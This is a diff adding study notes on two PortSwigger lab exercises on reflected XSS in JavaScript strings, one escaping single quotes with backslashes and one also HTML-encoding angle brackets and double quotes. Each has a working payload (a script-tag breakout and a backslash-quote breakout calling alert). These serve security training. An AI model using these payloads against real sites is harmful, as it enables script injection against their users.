@@ -113,4 +113,22 @@ location = 'https://0a21007b032e40bc807f498000a7008a.web-security-academy.net/?s
 
 # Reflected XSS into a JavaScript string with single quote and backslash escaped
 
+Single quote gets backslash-escaped, preventing you from breaking out of the string.
+
+```html
+</script><script>alert(1)</script>
+```
+
+
+# Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped
+
+The value of the **search** request parameter is copied into a JavaScript string which is encapsulated in single quotation marks. 
+
+```js
+\';alert(1)//
+```
+
+![[Pasted image 20240808045534.png]]
+
+
 
